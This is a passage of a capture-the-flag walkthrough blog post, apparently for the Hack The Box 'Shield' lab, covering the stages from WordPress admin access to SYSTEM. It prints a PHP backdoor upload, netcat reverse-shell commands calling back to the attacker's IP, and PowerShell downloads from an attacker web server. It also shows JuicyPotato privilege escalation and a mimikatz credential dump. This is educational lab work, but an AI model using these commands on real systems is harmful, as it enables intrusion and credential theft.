layout="responsive"></amp-img></figure><p>Now you can enter above credentials ☝☝ and click enter. You are successfully logging to the wordpress site as admin. 👑👑</p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-44.png" class="kg-image" alt width="1341" height="735" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-44.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-44.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-44.png 1341w" layout="responsive"></amp-img></figure><hr></hr><h2 id="02-foothold">02. Foothold</h2><p>Now it's time to upload reverse shell. But keep in mind that you are on the Windows machine. So you must have <code>windows php reverse shell</code> to gain access. Let's upload a bind shell. You can download it from <a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/php/simple-backdoor.php" rel="noopener noreferrer">here</a>. And also we need netcat binary file to get reverse shell. You can download it from <a href="https://github.com/int0x33/nc.exe?files=1" rel="noopener noreferrer">here</a>. 😊😊</p><pre><code class="language-bash">wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/php/simple-backdoor.php
+wget https://github.com/int0x33/nc.exe/raw/master/nc.exe</code></pre><p>By looking at the dashboard settings, it's obvious that we have an option to upload media, themes, pages, etc. I’ll start from the themes to see what we can do.</p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-45.png" class="kg-image" alt width="784" height="692" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-45.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-45.png 784w" layout="responsive"></amp-img></figure><p>Then click Add New button.</p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-46.png" class="kg-image" alt width="955" height="513" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-46.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-46.png 955w" layout="responsive"></amp-img></figure><p><br />Browse and upload both netcat binary and bind shell php script.</p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-47.png" class="kg-image" alt width="1071" height="541" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-47.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-47.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-47.png 1071w" layout="responsive"></amp-img></figure><p>Click "Install Now" button to upload. When you upload the files, You might get an error like this. It's just ok to ignore this error. 😉😉</p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-48.png" class="kg-image" alt width="1029" height="388" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-48.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-48.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-48.png 1029w" layout="responsive"></amp-img></figure><p>Then navigate to<code>http://10.10.10.29/wordpress/wp-content/Uploads/simple-backdoor.php?cmd=dir</code></p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma9_ZUgRZPcsIQ0dCtu%2F-Ma9a8-AHdQanTEn7xXX%2Fimage.png?alt=media&amp;token=3d967050-fde1-47d1-8870-9d35b320079e" class="kg-image" alt width="957" height="450" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><div><div>Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>As you can see, now we have a simple bind shell. Let's gain reverse shell using this with the help of our netcat binary file. First, power up a netcat listener then navigate to following url. (Change the <code>&lt;YourIP&gt;</code> and <code>&lt;PORT&gt;</code> as yours). <code>%20</code> is indicated as space in url encoding. 😋😋</p><p><code>http://10.10.10.29/Wordpress/wp-content/Uploads/simple-backdoor.php?cmd=.\nc.exe%20-e%20cmd.exe%20&lt;YourIP&gt;%20&lt;PORT&gt;</code></p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma9_ZUgRZPcsIQ0dCtu%2F-Ma9bcymZhCbDUY9MRSH%2Fimage.png?alt=media&amp;token=3d2aa86d-f7d5-4d2d-bdce-ee98818a8ba4" class="kg-image" alt width="1222" height="586" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><div><div>Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Now we are on the box as <code>iusr</code>user. Let's find the user flag.</p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma9_ZUgRZPcsIQ0dCtu%2F-Ma9byqS0wXbsGl3qeD3%2Fimage.png?alt=media&amp;token=759afd63-8c52-4703-a203-ca2b4566d705" class="kg-image" alt width="595" height="351" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><div><div>Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Here we have one user called <code>sandra</code>and we don't have access to this account. It's means this is time to escalate privileges.</p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-49.png" class="kg-image" alt width="480" height="200" layout="responsive"></amp-img></figure><hr></hr><h2 id="03-privilege-escalation">03. Privilege Escalation</h2><p>Let's enumerate further to get any vulnerability to gain privilege access. First, we need to check system info.</p><pre><code class="language-bash">C:\Users&gt;systeminfo
+systeminfo
+
+Host Name:                 SHIELD
+OS Name:                   Microsoft Windows Server 2016 Standard
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00376-30000-00299-AA303
+Original Install Date:     2/4/2020, 12:58:01 PM
+System Boot Time:          5/20/2021, 9:43:58 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume2
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,031 MB
+Virtual Memory: Max Size:  2,431 MB
+Virtual Memory: Available: 1,375 MB
+Virtual Memory: In Use:    1,056 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    MEGACORP.LOCAL
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0 2
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.29
+                                 [02]: fe80::1588:3a1b:bef9:58b8
+                                 [03]: dead:beef::1588:3a1b:bef9:58b8
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</code></pre><p>Then check what privileges we have now.</p><pre><code class="language-bash">C:\Users&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name          Description                               State
+======================= ========================================= =======
+SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
+SeImpersonatePrivilege  Impersonate a client after authentication Enabled 👈
+SeCreateGlobalPrivilege Create global objects                     Enabled</code></pre><p>Woooh!! We have the <code>SeImpersonatePrivilege</code>enabled. 🤩🤩 You know what it means, it means we can run <a href="https://github.com/ohpe/juicy-potato" rel="noopener noreferrer">juicy potato</a> to gain privilege. 🥔🥔Let's do it..</p><blockquote>Juicy Potato is a variant of the exploit that allows service accounts on Windows to escalate to SYSTEM (highest privileges) by leveraging the BITS and the <code>SeAssignPrimaryToken</code> or <code>SeImpersonate</code> privilege in a MiTM attack.</blockquote><p>Download the <a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe" rel="noopener noreferrer">JuicyPotato </a>binary file and rename it to another file name. Because sometimes windows defender will hate us. And we need to upload it to the box. To do so, power up python demon web server on your machine.</p><pre><code class="language-bash">┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# mv JuicyPotato.exe potato.exe
+
+┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><p>Then we need to upload it in to the box. Type the following command on windows machine <code>(Change &lt;YourIP&gt;)</code>.</p><pre><code class="language-bash">Powershell -c "IWR -useBasicParsing http://&lt;YourIP&gt;:8000/potato.exe -o potato.exe"</code></pre><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-50.png" class="kg-image" alt width="1208" height="270" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-50.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-50.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-50.png 1208w" layout="responsive"></amp-img></figure><p><br />If you read the <a href="https://github.com/ohpe/juicy-potato" rel="noopener noreferrer">documentation </a>of Juicy Potato you will realize it needs Batch file to run. So now we need to create bat file using following commands.</p><pre><code class="language-bash">echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe YourIP YourPort &gt; sh3ll.bat</code></pre><p>Change <code>YourIP </code>and <code>YourPort </code>as yours. After create the batch file, view that file using <code>type </code>command to verify.</p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-51.png" class="kg-image" alt width="1461" height="132" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-51.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-51.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-51.png 1461w" layout="responsive"></amp-img></figure><p><br />Then all the things are fine. Now it's time to exploit. Let's power up netcat listener again and execute the following command. If you failed to get reverse shell; change the <code>-c</code> parameter (CLSID) from using <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard" rel="noopener noreferrer">this </a>document and run again. 😎</p><pre><code class="language-bash">.\potato.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -p C:\inetpub\wwwroot\wordpress\wp-content\Uploads\sh3ll.bat -l 1337</code></pre><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-52.png" class="kg-image" alt width="1599" height="434" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-52.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-52.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-52.png 1599w" layout="responsive"></amp-img></figure><p><br />We are done. Now we have ultimate power. 🤠🤠</p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-53.png" class="kg-image" alt width="731" height="328" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-53.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-53.png 731w" layout="responsive"></amp-img></figure><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-54.png" class="kg-image" alt width="851" height="773" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-54.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-54.png 851w" layout="responsive"></amp-img></figure><hr></hr><h3 id="04-post-exploitation">04. Post Exploitation</h3><p>Now we are at <code>NT AUTHORITY\SYSTEM</code> level. So let’s upload <a href="https://github.com/gentilkiwi/mimikatz/wiki" rel="noopener noreferrer">mimikatz </a>and see what we can pull. Mimikatz can be used to dump cached passwords. Download  <code>mimikatz</code> tool from <a href="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip" rel="noopener noreferrer">here</a> and upload it to the box.</p><pre><code class="language-bash">wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip &amp;&amp; unzip mimikatz_trunk.zip &amp;&amp; cd x64 &amp;&amp; python3 -m http.server</code></pre><pre><code class="language-bash">IWR -useBasicParsing http://&lt;YourIP&gt;:8000/mimikatz.exe -o mcat.exe</code></pre><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-55.png" class="kg-image" alt width="1124" height="493" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-55.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-55.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-55.png 1124w" layout="responsive"></amp-img></figure><p>Then we can run that file by typing <code>.\mcat</code></p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-56.png" class="kg-image" alt width="919" height="382" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-56.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-56.png 919w" layout="responsive"></amp-img></figure><p><br />We execute mimikatz and use the sekurlsa command to extract logon passwords: <code>sekurlsa::logonpasswords</code></p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-57.png" class="kg-image" alt width="803" height="491" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-57.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-57.png 803w" layout="responsive"></amp-img></figure><p>And we found the password <code>Password1234!</code> for domain user <code>Sandra </code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaCWJxaHniWSpPAiRIa%2F-MaCX1_CLo6zsW-pdUev%2Fimage.png?alt=media&amp;token=4c52c5e6-1f75-4d78-9363-ee53dd0992ec" class="kg-image" alt width="499" height="451" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><div><div>Enter a caption for this image (optional)</div></div></span></figcaption></figure><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a> </p>
+
+            </section>
+
+        </article>
+    </main>
+    <footer class="page-footer">
+            <amp-img class="site-icon" src="http://192.168.8.3:2368/content/images/2021/05/hnet.com-image.ico" width="50" height="50" layout="fixed"></amp-img>
+        <h3>h4rithd.com</h3>
+            <p>Penetration Tester | Ethical Hacker | Security Researcher</p>
+        <p><a href="../../index.html">Read more posts →</a></p>
+        <a class="powered" href="https://ghost.org" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 156 156"><g fill="none" fill-rule="evenodd"><rect fill="#15212B" width="156" height="156" rx="27"/><g transform="translate(36 36)" fill="#F6F8FA"><path d="M0 71.007A4.004 4.004 0 014 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0130 84H4a4 4 0 01-4-4.007v-8.986zM50 71.007A4.004 4.004 0 0154 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0180 84H54a4 4 0 01-4-4.007v-8.986z"/><rect y="34" width="84" height="17" rx="4"/><path d="M0 4.007A4.007 4.007 0 014.007 0h41.986A4.003 4.003 0 0150 4.007v8.986A4.007 4.007 0 0145.993 17H4.007A4.003 4.003 0 010 12.993V4.007z"/><rect x="67" width="17" height="17" rx="4"/></g></g></svg> Published with Ghost</a>
+    </footer>
+    
+</body>
+</html>
